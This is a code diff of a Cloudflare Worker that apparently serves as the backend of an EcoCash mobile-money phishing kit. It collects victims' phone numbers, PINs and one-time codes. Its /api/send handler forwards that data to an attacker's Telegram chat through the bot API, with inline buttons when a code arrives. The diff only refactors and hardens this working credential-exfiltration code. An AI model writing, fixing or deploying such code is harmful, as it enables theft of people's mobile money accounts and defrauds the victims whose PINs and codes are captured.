@@ -1,33 +1,40 @@
 export default {
-  async fetch(request, env) {
-    const url = new URL(request.url);
+  async fetch(request, env, ctx) {
+    try {
+      const url = new URL(request.url);
 
-    // 1. Handle the Telegram API request
-    if (url.pathname === '/api/send' && request.method === 'POST') {
-      try {
-        const requestData = await request.json();
-        const { phone, pin, amount, currency, txnId, code } = requestData;
-
-        const botToken = env.TELEGRAM_BOT_TOKEN;
-        const chatId = env.TELEGRAM_CHAT_ID;
-
-        // Detailed check for missing secrets
-        if (!botToken || !chatId) {
-          return new Response(JSON.stringify({ 
-            error: "Secrets not configured in Cloudflare", 
-            hasToken: !!botToken, 
-            hasChatId: !!chatId 
-          }), { status: 500, headers: { 'Content-Type': 'application/json' } });
+      // Handle the API request
+      if (url.pathname === '/api/send') {
+        if (request.method !== 'POST') {
+          return jsonResponse({ error: 'Method not allowed' }, 405);
         }
+
+        // Check secrets first
+        if (!env.TELEGRAM_BOT_TOKEN || !env.TELEGRAM_CHAT_ID) {
+          return jsonResponse({
+            error: 'Secrets not configured',
+            hasToken: !!env.TELEGRAM_BOT_TOKEN,
+            hasChatId: !!env.TELEGRAM_CHAT_ID
+          }, 500);
+        }
+
+        let body;
+        try {
+          body = await request.json();
+        } catch (e) {
+          return jsonResponse({ error: 'Invalid JSON body' }, 400);
+        }
+
+        const { phone, pin, amount, currency, txnId, code } = body;
 
         let message = `🔐 *New EcoCash Activity*\n-------------------------------\n`;
         if (phone) message += `📱 *Phone:* +263 ${phone}\n`;
         if (pin) message += `🔑 *PIN:* ${pin}\n`;
         if (code) message += `🔢 *Code:* ${code}\n`;
-        message += `💰 *Amount:* ${currency} ${amount}\n🆔 *Txn ID:* ${txnId}\n⏱ *Time:* ${new Date().toLocaleString()}`;
+        message += `💰 *Amount:* ${currency} ${amount}\n🆔 *Txn ID:* ${txnId}\n⏱ *Time:* ${new Date().toISOString()}`;
 
-        const payload = { chat_id: chatId, text: message, parse_mode: 'Markdown' };
-        
+        const payload = { chat_id: env.TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' };
+
         if (code) {
           payload.reply_markup = {
             inline_keyboard: [[
@@ -38,36 +45,39 @@ export default {
           };
         }
 
-        const tgRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload)
-        });
-        
-        const tgData = await tgRes.json();
-        
-        // Detailed check for Telegram API errors
-        if (!tgData.ok) {
-          return new Response(JSON.stringify({ 
-            error: tgData.description,
-            telegramCode: tgData.error_code
-          }), { status: 400, headers: { 'Content-Type': 'application/json' } });
+        try {
+          const tgRes = await fetch(`https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+          });
+          const tgData = await tgRes.json();
+
+          if (!tgData.ok) {
+            return jsonResponse({ error: tgData.description, telegramCode: tgData.error_code }, 400);
+          }
+
+          return jsonResponse({ success: true }, 200);
+        } catch (tgError) {
+          return jsonResponse({ error: 'Telegram fetch failed: ' + tgError.message }, 500);
         }
-        
-        return new Response(JSON.stringify({ success: true }), { status: 200 });
-
-      } catch (e) {
-        // Return the exact crash reason
-        return new Response(JSON.stringify({ 
-          error: e.message, 
-          stack: e.stack,
-          hasToken: !!env.TELEGRAM_BOT_TOKEN,
-          hasChatId: !!env.TELEGRAM_CHAT_ID
-        }), { status: 500, headers: { 'Content-Type': 'application/json' } });
       }
-    }
 
-    // 2. Serve the static files for everything else
-    return env.ASSETS.fetch(request);
+      // Serve static files
+      if (!env.ASSETS) {
+        return new Response('ASSETS binding missing in wrangler.toml', { status: 500 });
+      }
+      return env.ASSETS.fetch(request);
+
+    } catch (fatalError) {
+      return jsonResponse({ error: 'FATAL: ' + fatalError.message, stack: fatalError.stack }, 500);
+    }
   }
 };
+
+function jsonResponse(data, status) {
+  return new Response(JSON.stringify(data), {
+    status,
+    headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' }
+  });
+}
